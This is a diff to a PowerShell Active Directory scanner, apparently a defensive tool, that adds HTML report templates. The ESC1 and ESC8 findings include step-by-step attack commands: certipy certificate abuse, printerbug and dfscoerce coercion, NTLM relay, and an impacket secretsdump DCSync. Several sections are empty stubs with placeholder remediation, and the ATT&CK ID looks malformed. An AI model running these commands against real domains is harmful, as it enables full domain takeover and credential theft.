@@ -159,7 +159,7 @@ function Invoke-ADScanner {
 
     #TO-DO - add functionality to do individual scans (for prioritised remediation)
 
-    #TD-DO - add functionality to exclude GPT (if executing in environment where outbound access is not permitted)
+    #TD-DO - add functionality to exclude GPT (if executing in environment where outbound access is not permitted / privacy concerns)
 
     
     # Create variables to store the findings
@@ -168,7 +168,7 @@ function Invoke-ADScanner {
     $PKI = @()
     $RBAC = @()
     $ACLs = @()
-    $Pwd = @()
+    $Passwords = @()
     $MISC = @()
     $Legacy = @()
 
@@ -228,8 +228,6 @@ function Invoke-ADScanner {
 </div>
 "@
 
-    #output to a file
-    #$DomainInfohtml | Out-File -FilePath "report.html"
 
     # PKI - ADCS
     if ($Scans -eq "ADCS" -or $Scans -eq "All") {
@@ -242,6 +240,302 @@ function Invoke-ADScanner {
         $PKI += Find-ESC7 -Domain $Domain
         $PKI += Find-ESC8 -Domain $Domain
     }
+    if(!$PKI){
+        $PKIhtml = @"
+        <div class="finding-header">PKI</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $PKIhtml = @"
+        <div class="finding-header">PKI</div>
+        <div class="finding-container">
+        <table>
+            <thead>
+                <tr>
+                    <th class="table-header">Issue</th>
+                    <th class="table-header">Risk</th>
+                </tr>
+            </thead>
+            <tbody>
+"@
+        foreach ($finding in $PKI) {
+            if($finding.Technique -eq "ESC1"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
+                $PKIhtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template and supplying a SAN.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
+                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
+                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
+                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC1 is a vulnerability where a certificate template permits Client Authentication and allows the enrollee to supply a different username than their own using a Subject Alternative Name (SAN) without manager approval. 
+                                            A SAN is an extension that allows multiple identities to be bound to a certificate beyond just the subject of the certificate. A common use for SANs is supplying additional host names for HTTPS certificates. For example, if a web server hosts content for multiple domains, each applicable domain could be included in the SAN so that the web server only needs a single HTTPS certificate instead of one for each domain. This is all well and good for HTTPS certificates, but when combined with certificates that allow for domain authentication, a dangerous scenario can arise.</p>
+                                            <p>This allows a low-privileged user to enroll in $($finding.Name) supplying a SAN of Administrator, and then authenticate as the domain administrator.</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
+                                                    </p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC1-1.png"
+                                                        alt="Finding ESC1">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC1-template -upn administrator@test.local -dns dc.test.local</p>
+                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain prvililege escalation.</p>
+                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC1-2.png"
+                                                        alt="Exploiting ESC1">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Remove ability to supply SAN or restrict who can enroll in cert (to prviileged users only)</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@  
+            }
+            elseif($finding.Technique -eq "ESC2"){
+                $PKIhtml += @"
+"@
+            }
+            elseif($finding.Technique -eq "ESC3"){
+                $PKIhtml += @"
+"@
+            }
+            elseif($finding.Technique -eq "ESC4"){
+                $PKIhtml += @"
+"@  
+            }
+            elseif($finding.Technique -eq "ESC5"){
+                $PKIhtml += @"  
+"@  
+            }
+            elseif($finding.Technique -eq "ESC6"){
+                $PKIhtml += @"
+"@
+            }
+            elseif($finding.Technique -eq "ESC7"){
+                $PKIhtml += @"
+"@
+            }
+            elseif($finding.Technique -eq "ESC8"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
+                $PKIhtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged users can impersonate the identity of a domain controller via a 'NTLM relay' attack.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">CA Name</td><td>$($finding."CA Name")</td></tr>
+                                            <tr><td class="grey">CA Endpoint</td><td>$($finding."CA Endpoint")</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the Web Enrollment service installed and is enabled via HTTP.
+                                                The web enrollment interface ($($finding."CA Endpoint")) is vulnerable to 'NTLM relay' attacks. 
+                                                    Without necessary protections, the web services endpoint can by-default be exploited to issue arbitrary certificates in the context of the coerced authentication (i.e. of a domain controller) to any low privileged user.</p>
+                                            <p>This allows a low-privileged user to escalate to a domain controller and extract all user passwords from the domain.</p>
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
+                                                    </p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png"
+                                                        alt="Finding ESC8">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A low-privileged user can by default coerce machine authentication using RPC from the domain controller to an attacker controlled machine
+                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
+                                                    </p>
+                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
+                                                        192.168.10.130</p>
+                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d test.local
+                                                        192.168.10.130 192.168.18.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
+                                                        alt="Coercing authentication">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>3. The coerced authentication is then relayed to an unsecured certificate HTTP endpoint (e.g. http://192.168.10.142/certsrv/certfnsh.asp)
+                                                         to enroll in the default "DomainController" certificate template under the context of the domain controller. This returns a pfx certificate as the domain controller.
+                                                    </p>
+
+                                                    <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
+                                                        DomainController</p>
+                                                        <p>This authentication certificate can be used to obtain the ntlm hash for the domain controller.</p>
+                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
+                                                    <p> The ntlm hash can then be used to replicate the behavior of a domain
+                                                        controller and obtain all the user password hashes within the domain via a DCSync.</p>
+                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
+                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
+                                                        alt="Relaying authentication to ADCS web endpoint">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Enforce HTTPS & EPA, disable Kerberos or disable the endpoint</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@  
+            }
+        }
+        $PKIhtml += "</tbody></table></div>"
+    }
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
     # Kerberos
     if ($Scans -eq "Kerberos" -or $Scans -eq "All") {
@@ -250,7 +544,34 @@ function Invoke-ADScanner {
         $Kerberos += Find-Delegations -Domain $Domain
         $Kerberos += Find-GoldenTicket -Domain $Domain
     }
-  
+    if(!$Kerberos){
+        $Kerberoshtml = @"
+        <div class="finding-header">Kerberos</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $Kerberoshtml = @"
+        <div class="finding-header">Kerberos</div>
+"@
+    }
+   
+    
+    # ACLs
+    if ($Scans -eq "ACLs" -or $Scans -eq "All") {
+        $ACLs += Find-ACLs -Domain $Domain
+    }
+    if(!$ACLs){
+        $ACLshtml = @"
+        <div class="finding-header">ACLs</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $ACLshtml = @"
+        <div class="finding-header">ACLs</div>
+"@
+    }
+
+
     # RBAC
     if ($Scans -eq "RBAC" -or $Scans -eq "All") {
         $RBAC += Find-PrivilegedGroups -Domain $Domain
@@ -259,20 +580,37 @@ function Invoke-ADScanner {
         $RBAC += Find-AnonymousAccess -Domain $Domain
         $RBAC += Find-SensitiveAccounts -Domain $Domain
     }
-
-    # ACLs
-    if ($Scans -eq "ACLs" -or $Scans -eq "All") {
-        $ACLs += Find-ACLs -Domain $Domain
+    if(!$RBAC){
+        $RBAChtml = @"
+        <div class="finding-header">RBAC</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $RBAChtml = @"
+        <div class="finding-header">RBAC</div>
+"@
     }
+
 
     # Passwords
     if ($Scans -eq "PwdPolicy" -or $Scans -eq "All" ) {
-        $Pwd += Find-PasswordPolicy -Domain $Domain
-        $Pwd += Find-PwdNotRequired -Domain $Domain
-        $Pwd += Find-LAPS -Domain $Domain
-        $Pwd += Find-SensitiveInfo -Domain $Domain
-        #$Pwd += Find-UserDescriptions -Domain $Domain -APIKey $APIkey
+        $Passwords += Find-PasswordPolicy -Domain $Domain
+        $Passwords += Find-PwdNotRequired -Domain $Domain
+        $Passwords += Find-LAPS -Domain $Domain
+        $Passwords += Find-SensitiveInfo -Domain $Domain
+        #$Passwords += Find-UserDescriptions -Domain $Domain -APIKey $APIkey
     }
+    if(!$Passwords){
+        $Passwordshtml = @"
+        <div class="finding-header">Passwords</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $Passwordshtml = @"
+        <div class="finding-header">Passwords</div>
+"@
+    }
+    
 
     # MISC
     if ($Scans -eq "MISC" -or $Scans -eq "All") {
@@ -284,13 +622,36 @@ function Invoke-ADScanner {
         $MISC += Find-WebDAV -Domain $Domain
         $MISC += Find-EfficiencyImprovements -Domain $Domain
     }
+    if(!$MISC){
+        $MISChtml = @"
+        <div class="finding-header">MISC</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $MISChtml = @"
+        <div class="finding-header">MISC</div>
+"@
+    }
+
 
     # Legacy
     if ($Scans -eq "Legacy" -or $Scans -eq "All") {
         $Legacy += Find-LegacyProtocols -Domain $Domain
         $Legacy += Find-UnsupportedOS -Domain $Domain
     }
+    if(!$Legacy){
+        $Legacyhtml = @"
+        <div class="finding-header">Legacy</div>
+        <h2 class="novuln">No vulnerabilities found!</h2>
+"@
+    } else{
+        $Legacyhtml = @"
+        <div class="finding-header">Legacy</div>
+"@
+    }
 
+
+    #Generate report
     Write-Host "$((Get-Date).ToString(""[HH:mm:ss tt]"")) Generating report..." -ForegroundColor Yellow
     if ($Scans -eq "All") {
         
@@ -359,7 +720,7 @@ function Invoke-ADScanner {
             @{Name = "PKI"; Variable = $PKI },
             @{Name = "RBAC"; Variable = $RBAC },
             @{Name = "ACLs"; Variable = $ACLs },
-            @{Name = "Passwords"; Variable = $Pwd },
+            @{Name = "Passwords"; Variable = $Passwords },
             @{Name = "MISC"; Variable = $MISC },
             @{Name = "Legacy"; Variable = $Legacy }
         )
@@ -495,7 +856,7 @@ function Invoke-ADScanner {
 
         #Ordered summary of risks
         $Risksummaries = "`r`n[*] Risk summaries:"
-        $Allissues += $PKI + $Kerberos + $RBAC + $ACLs + $Pwd + $MISC + $Legacy
+        $Allissues += $PKI + $Kerberos + $RBAC + $ACLs + $Passwords + $MISC + $Legacy
 
         #Add category to each issue
         $Allissues | ForEach-Object {
@@ -512,7 +873,7 @@ function Invoke-ADScanner {
                 elseif ($_ -in $ACLs) {
                     $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "ACLs"
                 }
-                elseif ($_ -in $Pwd) {
+                elseif ($_ -in $Passwords) {
                     $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "Passwords"
                 }
                 elseif ($_ -in $Legacy) {
@@ -671,7 +1032,7 @@ function Invoke-ADScanner {
 #                                     Passwords                                     #
 #####################################################################################
 "@
-        $Pwd | Sort-Object -Property Score -Descending | Format-List
+        $Passwords | Sort-Object -Property Score -Descending | Format-List
     }
 
     if ($Scans -eq "MISC" -or $Scans -eq "All") {
@@ -727,5 +1088,17 @@ function Invoke-ADScanner {
     $executiveSummaryHTML # executive summary with GPT
     $RisksummaryHTMLoutput # risk prioritisation summary
     $DomainInfohtml # first bit of technical section
+
+    #Technical sections
+    $PKIhtml
+    $Kerberoshtml
+    $ACLshtml
+    $RBAChtml
+    $Passwordshtml
+    $MISChtml
+    $Legacyhtml
+
+    #output to a file
+    #$DomainInfohtml | Out-File -FilePath "report.html"
     
 }
